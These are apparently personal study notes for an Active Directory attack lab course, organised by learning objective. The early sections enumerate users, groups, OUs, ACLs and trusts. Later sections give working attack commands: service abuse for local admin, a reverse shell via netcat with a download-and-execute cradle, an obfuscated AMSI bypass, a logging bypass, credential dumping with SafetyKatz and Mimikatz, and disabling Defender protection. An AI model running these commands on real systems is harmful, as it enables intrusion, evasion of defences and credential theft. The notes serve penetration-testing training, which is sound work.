
## Learning Objective #1
### PowerView
Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators

1. Run Invishell
	Initiate AMSI bypass if needed
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

2. Import PowerView
```
 . C:\AD\Tools\PowerView.ps1
```
3. Enumeration Domain Users
```
Get-DomainUser
```

	denote instances of sameaccountname: Administrator
4. Further refine the Domain User scan
```
Get-DomainUser | select -ExpandProperty samaccountname
```

5. Find member computers in the domain
```
Get-DomainComputer | select -ExpandProperty dnshostname
```

6. Find details on the Domain Admins group
```
Get-DomainGroup -Identity "Domain Admins"
```

7. Determine the members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins"
```

8. Determine the members of the Enterprise Admins group (needs to point to root domain)
```
Get-DomainGroupMember -Identity "Enterprise Admins" –Domain <corp>.local
```

### AD Module
1. Run Invishell
	Initiate AMSI bypass if needed
```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

2. Import AD Module
```
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```
```
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

3. Enumerate users on current domain
```
Get-ADUser -Filter *
```

4. Further refine the user search
```
Get-ADUser -Filter * -Properties *| select Samaccountname,Description
```

5. List all computers
```
Get-ADComputer -Filter *
```

6. Find details on Domain Admins
```
Get-ADGroupMember -Identity 'Domain Admins'
```

7. Find details on Enterpise Admins
```
Get-ADGroupMember -Identity 'Enterprise Admins' -Server <corp>.local
```


## Learning Objective 2
Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the StudentMachines OU.
− List the GPOs
− Enumerate GPO applied on the StudentMachines OU

1. List all OUs
```
Get-DomainOU
```

2. Refine the list down to only the names
```
Get-DomainOU | select -ExpandProperty name
```

3. List all computers in a <designated> OU
```
(Get-DomainOU -Identity <designated>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

4. List the GPOs
```
Get-DomainGPO
```

5. List the GPOs applied to <designated> OU
```
(Get-DomainOU -Identity <designated>).gplink
```

6. Further enumeration of the GPO, from the OU CN {x-x-x-x} from step 5
```
Get-DomainGPO -Identity '{x-x-x-x}'
```

7. Steps 5 & 6 can be combined
```
Get-DomainGPO -Identity (Get-DomainOU -Identity <designated>).gplink.substring(11,(Get-DomainOU -Identity <designated>).gplink.length-72)
```

## Learning Objective 3
Enumerate following for the dollarcorp domain:
− ACL for the Domain Admins group
− All modify rights/permissions for the studentx

1. List out the ACLs for the Domain Admins group
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs –Verbose
```

2. Check for modify right/permissions for <user>
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user>"}
```

3. Check the ACLs for a specific <group> you have users apart of
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<group>"}
```


## Learning Objective 4
- Enumerate all domains in the moneycorp.local forest.
- Map the trusts of the dollarcorp.moneycorp.local domain.
- Map External trusts in moneycorp.local forest.
- Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

### PowerView

1. Enumerate Domains in current forest
```
Get-ForestDomain -Verbose
```

2. Map out domain trusts
```
Get-DomainTrust
```
 3. List external trusts in current forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

4. List external trusts for the domain
```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
Can also be more readily achieved by this

```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

5. Lab instance had bi-directional trust to another <forest>. Further enumerate the new Forests
```
Get-ForestDomain -Forest <forest> | %{Get-DomainTrust -Domain $_.Name}
```

### AD Module

fill in~~


## Learning Objective 5
- Exploit a service on dcorp-studentx and elevate privileges to local administrator.
- Identify a machine in the domain where studentx has local administrative access.
- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -
the dcorp-ci server

Skipping methods related to application specific means. 


### PowerUp
1. Determine unquoted service paths
```
Get-ServiceUnquoted
```

2. Enumerate services where changes can be made to the service binary
```
Get-ModifiableServiceFile -Verbose
```

3. Enumerate services with weak service permissions
```
Get-ModifiableService
```

4. Use a modifiable <service> to exploit
```
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
```

~~~~additional notes will be linked on pushing commands ie cmd /c powershell-exe -command ()

5. If successful, can log off/on to come back with local admin privelege

6. *LA* Create a new InviShell
7. Import PSRemotingLocalAdminAccess
```
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```
8. Find where, in the domain, where the new local admin has access <server>
```
Find-PSRemotingLocalAdminAccess
```
9. On other machines that the *LA* has power in, test the connection with winrs
```
winrs -r:<server> cmd
```
```
whoami
```
```
hostname
```


10. Can also use PowerShell Remoting


 Enter-PSSession -ComputerName <server>.xxx.local


11. Create a reverse shell. This one is done through the use of PowerShell TCP
12. On host, setup a listener
```
nc64.exe -lvp 443
```
13. Have remote server download the associated PS-TCP script and execute
```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
```

```
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```



## Learning Objective 6
Bloodhound



## Learning Objective 7
- Identify a machine in the target domain where a Domain Admin session is available.
- Compromise the machine and escalate privileges to Domain Admin
	− Using access to dcorp-ci
	− Using derivative local admin

1.Setup the shell on the new machine/user as before
2. download -exec cradle sblogginbypass.txt (may need to be manual due to no in-memory powershell bypass)
```
iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```
3. Bypass ASMI (may need to be manual)
```
S`eT-It`em ( 'V'+'aR' +'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ;( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```
4. Import PowerView
```
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```
5. Find location of Domain Users - hopefully find a new server to jump to
```
Find-DomainUserLocation
```
6. The goal now is to extract credentials from a new management server, utilizing *Loader.exe* (going from our current shell {ci} to our target)
7. Import Loader onto the CI machine
```
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```
8. Transfer to the target
```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
9. To avoid detection on this new target, a port forward will be setup on CI. This will bounce it back to the main machine
```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
```
10. Use Loader.exe on the target machine through the use of winrs
```
 $null | winrs -r:dcorp- mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```
11. This may result in some open credentials, possibly of service accounts
### Abuse PS Remoting
12. USE PS-Rem to see if the CI can run commands on the target {mgt}
```
 Invoke-Command -
ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
```



13. Attempt to dump hashes from mgt with Mimikatz. Host Invoke-Mimikatz.ps1 on main machine
```
 iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

14. If failed, may need to bypass ASMI. That can be done the same as before; with admin privelege it cna be disabled. 
``` $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```



